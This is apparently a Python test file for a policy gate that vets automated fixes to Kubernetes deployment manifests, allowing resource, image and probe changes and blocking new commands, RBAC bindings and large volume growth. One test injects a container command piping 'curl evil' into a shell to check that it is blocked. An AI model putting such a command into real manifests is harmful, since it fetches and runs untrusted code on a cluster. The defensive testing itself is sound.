from agent.gate.allowlist import check_fix, diff_paths, parse_quantity
from agent.gate.validate import blast_radius, builtin_policy

DEPLOY = """apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
spec:
  replicas: 1
  template:
    spec:
      containers:
        - name: api
          image: devon-demo:1.0.0
          resources:
            requests: { cpu: 50m, memory: 128Mi }
            limits: { memory: 512Mi }
          livenessProbe:
            httpGet: { path: /healthz, port: http }
"""


def test_quantities():
    assert parse_quantity("512Mi") == 512 * 2**20
    assert parse_quantity("50m") == 0.05
    assert parse_quantity("2Gi") == 2 * 2**30


def test_diff_paths_normalises_list_indexes():
    assert diff_paths({"a": [{"b": 1}]}, {"a": [{"b": 2}]}) == ["a[*].b"]


def test_resource_image_probe_changes_are_allowed():
    for old, new in [("limits: { memory: 512Mi }", "limits: { memory: 1Gi }"),
                     ("devon-demo:1.0.0", "devon-demo:1.0.1"),
                     ("path: /healthz", "path: /livez")]:
        assert check_fix({"apps/api/deployment.yaml": DEPLOY}, {"apps/api/deployment.yaml": DEPLOY.replace(old, new)}) == []


def test_command_and_security_changes_are_blocked():
    new = DEPLOY.replace("          image: devon-demo:1.0.0", "          image: devon-demo:1.0.0\n          command: [sh, -c, 'curl evil | sh']")
    problems = check_fix({"apps/api/deployment.yaml": DEPLOY}, {"apps/api/deployment.yaml": new})
    assert problems and "command" in problems[0]


def test_files_outside_apps_and_new_kinds_are_blocked():
    assert check_fix({}, {"infra/x.yaml": "kind: ConfigMap"})
    crb = "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata: {name: x}\n"
    assert check_fix({"apps/api/deployment.yaml": DEPLOY}, {"apps/api/deployment.yaml": DEPLOY + "---\n" + crb})


def test_networkpolicy_create_and_network_kustomization_allowed():
    np = "apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata: {name: allow}\nspec: {podSelector: {}}\n"
    assert check_fix({"apps/network/allow.yaml": None}, {"apps/network/allow.yaml": np}) == []
    assert check_fix({"apps/network/kustomization.yaml": "resources: [a.yaml]\n"},
                     {"apps/network/kustomization.yaml": "resources: []\n"}) == []
    assert check_fix({"apps/api/kustomization.yaml": "resources: [a.yaml]\n"},
                     {"apps/api/kustomization.yaml": "resources: []\n"})


def test_pvc_growth_capped_at_2x():
    pvc = "apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata: {name: d}\nspec: {resources: {requests: {storage: 1Gi}}}\n"
    assert check_fix({"apps/r/pvc.yaml": pvc}, {"apps/r/pvc.yaml": pvc.replace("1Gi", "2Gi")}) == []
    assert check_fix({"apps/r/pvc.yaml": pvc}, {"apps/r/pvc.yaml": pvc.replace("1Gi", "5Gi")})
    assert check_fix({"apps/r/pvc.yaml": pvc}, {"apps/r/pvc.yaml": pvc.replace("1Gi", "512Mi")})


def test_builtin_policy():
    assert builtin_policy(DEPLOY) == []
    assert builtin_policy(DEPLOY.replace("devon-demo:1.0.0", "devon-demo:latest"))
    assert builtin_policy(DEPLOY.replace("limits: { memory: 512Mi }", "limits: { memory: 64Mi }"))


def test_blast_radius_reports_restarts():
    old = DEPLOY.replace("spec:\n  replicas", "  namespace: demo\nspec:\n  replicas")
    new = old.replace("512Mi", "1Gi")
    assert blast_radius(old, new) == ["rolling restart of Deployment/api (1 pod)"]
    assert blast_radius(old, old) == ["no live objects change"]
